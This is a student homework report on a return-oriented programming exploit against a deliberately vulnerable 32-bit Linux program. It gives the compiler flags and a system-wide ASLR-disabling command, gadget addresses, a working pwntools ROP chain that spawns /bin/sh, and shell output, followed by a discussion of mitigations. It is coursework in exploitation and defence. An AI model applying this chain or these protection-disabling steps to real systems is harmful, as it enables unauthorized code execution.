# ENPM691 Homework Assignment 07: Return Oriented Programming (ROP) Exploitation - Bypassing Non-Executable Stack Protection

**Vedant Bhalerao**  
vedantb@umd.edu

## Abstract

This report details the exploitation of a buffer overflow vulnerability using Return Oriented Programming (ROP) techniques to bypass Non-Executable (NX) stack protection. The exploit demonstrates how to chain together existing code segments (gadgets) within a vulnerable binary to achieve arbitrary code execution and spawn a shell, despite the presence of modern security mitigations. The methodology includes gadget discovery, payload construction, and practical exploitation using tools such as GDB, pwntools, and ropper.

**Index Terms:** Return Oriented Programming, ROP exploitation, Non-Executable stack bypass, NX protection bypass, Code reuse attacks, Gadget chaining, Memory corruption exploitation, Control flow hijacking, Binary exploitation, execve system call, Linux security bypass, Stack-based attacks, Privilege escalation, pwntools exploitation, GDB/pwndbg analysis, Security mitigation evasion, ASLR bypass techniques, Shellcode alternatives, Modern exploitation techniques, x86 assembly exploitation

## I. Introduction

Return Oriented Programming (ROP) represents an advanced exploitation technique that circumvents modern security defenses by reusing existing code segments within program memory. This assignment demonstrates practical ROP exploitation to bypass Non-Executable (NX) stack protection and achieve arbitrary code execution on vulnerable binaries, despite the presence of memory protection mechanisms.

The exploitation methodology involves chaining together short instruction sequences, known as "gadgets," that end with return instructions. By carefully constructing a ROP chain that sets up system call parameters and invokes the execve syscall, we can spawn a shell without executing any injected shellcode on the stack. This code-reuse approach effectively bypasses NX protection by leveraging the program's own executable code segments to achieve malicious objectives.

We employ comprehensive binary analysis using GDB with pwndbg extensions for gadget discovery, memory layout examination, and exploit verification. Tools such as ropper and pwntools facilitate automated gadget identification and payload construction. This systematic approach connects theoretical concepts of control-flow hijacking with practical exploitation techniques, providing valuable insights into both offensive security methodologies and the limitations of contemporary defense mechanisms in software security.

## II. Methodology

To investigate the behavior of Return Oriented Programming (ROP) exploitation, a structured development workflow was followed. The objective was to demonstrate controlled execution flow hijacking using code reuse techniques to bypass Non-Executable (NX) stack protection. All experiments were carried out on a Kali Linux virtual machine with isolated privileges to ensure reproducibility and safety. The GNU Debugger (gdb) with the pwndbg extension was used for interactive debugging, memory inspection, and ROP chain analysis.

### System Information:

- Operating System: Kali Linux
- Architecture: x86 (32-bit mode)
- Compiler: GCC 14.3.0
- Debugger: GDB with pwndbg
- ROP Analysis Tools: ropper for gadget discovery
- Payload Generator: Python 3 exploit script with pwntools

### A. Overview

The experiment involved two primary components:

- A vulnerable C program (rop.c) that intentionally performs unsafe input handling using gets(), creating a stack buffer overflow vulnerability in the Test() function.
- An exploit script (exploit.py) that constructs and delivers a ROP chain payload designed to execute the execve syscall and spawn /bin/sh without injecting any shellcode.

The ROP chain utilized gadgets from the gogodaaget() function within the binary itself, demonstrating pure code reuse to achieve arbitrary code execution while bypassing memory protection mechanisms.

### B. Compilation

The target binary was compiled as a 32-bit ELF executable with debugging symbols and specific security configurations to demonstrate ROP exploitation in a controlled environment. The exact build command was:

```bash
gcc -m32 -g rop.c -o rop -no-pie \
    -mpreferred-stack-boundary=2 -fno-pic \
    -fno-stack-protector
```

Compilation flags used:

- `-m32` — compile for 32-bit x86 architecture to maintain consistent memory addressing.
- `-g` — include debugging symbols for detailed GDB analysis and debugging.
- `-no-pie` — disable Position Independent Executable for predictable memory addresses.
- `-mpreferred-stack-boundary=2` — set stack alignment to 4-byte boundaries.
- `-fno-pic` — disable Position Independent Code generation.
- `-fno-stack-protector` — disable stack canaries to allow buffer overflow exploitation.

To ensure consistent memory layout for reliable exploitation, Address Space Layout Randomization (ASLR) was disabled system-wide:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### C. Binary Analysis and Gadget Discovery

Comprehensive binary analysis was performed to identify critical components for the ROP exploit:

- **String Location:** The /bin/sh string was located at address 0x0804a008 in the data section using ropper and objdump.
- **ROP Gadgets:** The gogodaaget() function contained six carefully crafted inline assembly gadgets:
  - `pop %eax; ret` at 0x080491fa
  - `pop %ebx; mov $100, %esi; pop %edi; ret` at 0x080491fc
  - `pop %ecx; mov $0xffffffff, %ebx; ret` at 0x08049204
  - `mov $0x0, %edx; inc %edx; ret` at 0x0804920b
  - `dec %edx; ret` at 0x08049212
  - `int $0x80; nop; nop; ret` at 0x08049214
- **Buffer Analysis:** The vulnerable buffer in Test() was 12 bytes, requiring 16 bytes total to overwrite the return address (12 bytes buffer + 4 bytes saved EBP).

### D. ROP Chain Construction

The exploit payload generated by exploit.py consisted of the following structured components:

1. **Buffer Overflow Padding:** A sequence of 16 'A' characters (0x41) to fill the 12-byte buffer and overwrite the saved EBP register.
2. **ROP Gadget Chain:** A carefully sequenced series of gadget addresses and data values:
   - pop eax gadget with value 0x0b (execve syscall number)
   - pop ecx gadget with value 0x00000000 (NULL for argv parameter)
   - pop ebx gadget with address 0x0804a008 (pointer to /bin/sh) and junk value 0xdeadbeef for the subsequent pop edi
   - Two-stage EDX zeroing using mov edx, 0; inc edx followed by dec edx to achieve EDX = 0x00000000 (NULL for envp parameter)
   - int 0x80 gadget to trigger the execve syscall
3. **Payload Delivery:** The final 56-byte payload was delivered to the vulnerable program via standard input through the gets() function in the Test() function.

### E. Debugging and Validation Methodology

Systematic debugging and validation were performed using multiple tools:

- **GDB with pwndbg:** Used for runtime analysis, breakpoint setting, and register state verification before syscall execution.
- **ropper:** Employed for automated gadget discovery and verification of available ROP gadgets.
- **objdump:** Utilized for static analysis of the binary and verification of gadget addresses.
- **checksec:** Used to confirm the security configuration of the target binary.

The ROP chain execution was validated by monitoring register states in GDB to ensure correct parameter setup for the execve syscall, followed by confirmation of successful shell spawning.

## III. Results

All experiments were conducted on a Kali Linux virtual machine. The vulnerable program was compiled as a 32-bit executable with specific security configurations to demonstrate ROP exploitation. Binary analysis tools were used for address verification and gadget discovery.

### A. Binary Compilation and Environment Setup

The binary was compiled and configured using the following commands:

```bash
gcc -m32 -g rop.c -o rop -no-pie \
    -mpreferred-stack-boundary=2 -fno-pic \
    -fno-stack-protector

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### B. Binary Analysis and Address Discovery

Binary analysis was performed to identify critical components for the ROP exploit:

```
$ ropper -f rop --string "/bin/sh"
Strings
=======
Address Value
------- -----
0x0804a008 /bin/sh
```

The /bin/sh string address used in the exploit was:
```
bin_sh_addr = 0x0804a008
```

objdump was used to disassemble the gogodaaget function and confirm gadget addresses:

```
$ objdump -d rop
080491f7 <gogodaaget>:
80491f7: 55 push %ebp
80491f8: 89 e5 mov %esp,%ebp
80491fa: 58 pop %eax
80491fb: c3 ret
80491fc: 5b pop %ebx
80491fd: be 64 00 00 00 mov $0x64,%esi
8049202: 5f pop %edi
8049203: c3 ret
8049204: 59 pop %ecx
8049205: bb ff ff ff ff mov $0xffffffff,%ebx
804920a: c3 ret
804920b: ba 00 00 00 00 mov $0x0,%edx
8049210: 42 inc %edx
8049211: c3 ret
8049212: 4a dec %edx
8049213: c3 ret
8049214: cd 80 int $0x80
8049216: 90 nop
8049217: 90 nop
8049218: c3 ret
```

The ROP gadget addresses used in the exploit were:

- pop eax; ret: 0x080491fa
- pop ebx; mov esi, 0x64; pop edi; ret: 0x080491fc
- pop ecx; mov ebx, 0xffffffff; ret: 0x08049204
- mov edx, 0; inc edx; ret: 0x0804920b
- dec edx; ret: 0x08049212
- int 0x80; nop; nop; ret: 0x08049214

### C. Exploit Payload Construction

The exploit generator constructed the final ROP chain payload:

```python
gadget_pop_eax = 0x080491fa
gadget_pop_ebx = 0x080491fc
gadget_pop_ecx = 0x08049204
gadget_zero_edx1 = 0x0804920b
gadget_zero_edx2 = 0x08049212
gadget_int_80 = 0x08049214

addr_bin_sh = 0x0804a008

payload = b'A' * 16
payload += flat([
    gadget_pop_eax, 0x0b,
    gadget_pop_ecx, 0x0,
    gadget_pop_ebx, addr_bin_sh, 0xdeadbeef,
    gadget_zero_edx1,
    gadget_zero_edx2,
    gadget_int_80
])
```

Key values used in the working payload:

- Padding: 16 bytes
- Total payload size: 56 bytes
- /bin/sh string address: 0x0804a008
- execve syscall number: 0x0b

### D. Exploit Execution and Verification

The exploit was executed as shown below:

```
$ python3 exploit.py
[*] Payload length: 56
[+] Starting local process './rop': pid 46745
[*] Switching to interactive mode
/bin/sh is a great command, isn't it?
AAAAAAAAAAAAAAAA\xfa\x91\x04\x08\x0b
$ ls
exploit.py rop rop.c
$ whoami
vedant
```

The successful execution confirms that:

- The ROP chain executed the execve syscall
- /bin/sh was spawned
- Interactive shell access was achieved
- The exploit bypassed NX protection

## IV. Discussion

This section interprets the experimental evidence collected from the rop program and the corresponding ROP exploit. It links the observed debugger output and runtime behavior to underlying CPU architecture and operating system semantics, compares the ROP technique with traditional exploitation methods, and discusses practical security implications and mitigation strategies.

### A. Mechanics of ROP Chain Execution and Shell Spawning

The experiment demonstrates a systematic approach to achieving arbitrary code execution through pure code reuse:

1. **Control Flow Hijacking via Buffer Overflow.** The vulnerable gets() function in the Test() function allowed precise overwriting of the return address with the address of the first ROP gadget at 0x080491fa. This initial redirection subverted normal program execution and initiated the controlled gadget chain.

2. **Systematic Register Initialization through Gadget Chaining.** Each ROP gadget performed a specific operation before returning to the next gadget address on the stack. The carefully orchestrated sequence:
   - Loaded 0x0b into EAX using the pop eax; ret gadget
   - Set 0x0804a008 (/bin/sh address) into EBX using the pop ebx; ... gadget
   - Initialized ECX to 0x00000000 for argv parameter
   - Zeroed EDX through a two-stage process using mov edx, 0; inc edx followed by dec edx
   - Triggered the syscall via int $0x80

3. **Code Reuse Without Memory Protection Violation.** The ROP technique exclusively utilized existing executable code segments within the binary's .text section. This approach effectively circumvented NX protection by never attempting to execute data on the stack as code, instead repurposing legitimate instruction sequences that were already marked as executable.

The successful interactive shell access confirmed that the ROP chain correctly invoked the execve syscall, spawning /bin/sh while maintaining the original process execution context.

### B. Comparison with Traditional Exploitation Methods

The ROP exploitation technique represents a significant advancement beyond traditional buffer overflow attacks:

- **Memory Protection Bypass:** Traditional shellcode injection requires executable stack regions, while ROP functions with NX-enabled binaries by reusing existing code pages from the binary itself.
- **Code Provenance:** Shellcode injection introduces external code into process memory, while ROP exclusively uses the program's own code segments, making detection through signature-based approaches considerably more challenging.
- **Exploit Development Complexity:** ROP chains demand extensive binary analysis, gadget discovery, and careful chain construction, representing higher initial development complexity but resulting in more robust exploits against basic security solutions.
- **Payload Characteristics:** Traditional shellcode is typically compact and self-contained, while ROP chains involve multiple gadget addresses and intermediate data values, often resulting in larger payload sizes.

### C. Security Implications and Modern Mitigations

While this demonstration employed a controlled environment with specific protections disabled, the technique reveals critical security considerations:

- **NX Protection Inadequacy:** The experiment clearly demonstrates that Non-Executable memory protection alone provides insufficient defense against determined attackers. Code reuse attacks effectively bypass this fundamental security mechanism.

- **Address Space Layout Randomization (ASLR):** In production environments with ASLR enabled, our hard-coded gadget addresses would be rendered ineffective, necessitating information leakage vulnerabilities to deduce runtime addresses.

- **Stack Protection Mechanisms:** The absence of stack canaries permitted unrestricted buffer overflow exploitation. Modern compilation practices incorporate stack protectors that detect and prevent return address corruption.

- **Control Flow Integrity (CFI):** Advanced mitigation techniques can enforce predetermined execution graphs, validating control flow transfers and preventing unexpected jumps to gadget addresses.

- **Compiler and Linker Hardening:** Contemporary toolchains offer extensive hardening options including -fstack-protector-strong, -D_FORTIFY_SOURCE=2, and link-time optimization that collectively strengthen binary resilience.

### D. Conclusion

The collected evidence substantiates the core thesis of this assignment: Return Oriented Programming provides a sophisticated and effective methodology for bypassing non-executable memory protections through systematic code reuse. By strategically chaining together existing instruction sequences within a vulnerable binary, we achieved arbitrary code execution and shell spawning while fully complying with memory protection policies.

The comprehensive GDB analysis and successful exploit execution demonstrate that while individual security mechanisms offer important protective barriers, only comprehensive defense-in-depth strategies provide robust application security. The enduring relevance of ROP in both offensive security research and defensive countermeasure development underscores the persistent arms race in software security, highlighting the ongoing need for advanced protection mechanisms and secure development practices.

## V. Appendix

### Appendix A: Source files

See `src/` directory for:
- `rop.c` - Vulnerable program with buffer overflow and ROP gadgets
- `exploit.py` - Python exploit script using pwntools

### Appendix B: Compilation Commands

```bash
gcc -m32 -g rop.c -o rop -no-pie \
    -mpreferred-stack-boundary=2 -fno-pic \
    -fno-stack-protector

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Appendix C: Address Discovery Commands

```bash
ropper -f rop --string "/bin/sh"
objdump -d rop
```

### Appendix D: Exploit Execution

```bash
python3 src/exploit.py
```

## References

[1] H. Shacham, "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)," in Proceedings of the 14th ACM Conference on Computer and Communications Security, 2007, pp. 552–561.

[2] R. Roemer, E. Buchanan, H. Shacham, and S. Savage, "Return-Oriented Programming: Systems, Languages, and Applications," ACM Transactions on Information and System Security, vol. 15, no. 1, pp. 1–34, 2012.

[3] R. E. Bryant and D. R. O'Hallaron, Computer Systems: A Programmer's Perspective, 3rd ed. Boston, MA: Pearson, 2016.

[4] A. S. Tanenbaum and H. Bos, Modern Operating Systems, 4th ed. Upper Saddle River, NJ: Pearson, 2015.

[5] E. Aleph One, "Smashing the Stack for Fun and Profit," Phrack Magazine, Issue 49, 1996. [Online]. Available: http://phrack.org/issues/49/14.html

[6] Free Software Foundation, GCC: GNU Compiler Collection Manual. [Online]. Available: https://gcc.gnu.org/onlinedocs/

[7] Free Software Foundation, GDB: The GNU Project Debugger. [Online]. Available: https://www.gnu.org/software/gdb/

[8] Pwndbg Team, Pwndbg: GDB Plugin for Exploit Development. [Online]. Available: https://github.com/pwndbg/pwndbg

[9] M. Kerrisk, execve(2) — Linux Manual Page. [Online]. Available: https://man7.org/linux/man-pages/man2/execve.2.html

